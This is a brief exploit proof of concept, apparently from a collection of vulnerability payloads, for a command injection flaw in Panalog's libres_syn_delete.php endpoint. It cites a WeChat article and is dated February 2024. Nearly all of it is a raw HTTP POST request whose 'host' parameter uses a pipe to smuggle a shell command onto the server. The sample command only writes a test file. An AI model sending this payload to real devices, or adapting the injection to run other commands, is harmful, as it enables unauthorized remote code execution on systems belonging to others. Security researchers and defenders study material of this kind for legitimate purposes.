# panalog_libres_syn_delete_rce


from: https://mp.weixin.qq.com/s/80syPvs6o7ZAAwJ9_xDRAA

2024.02.19 @2

```
POST /content-apply/libres_syn_delete.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
 
token=1&id=2&host=| echo "Hello World!" >1.txt
```
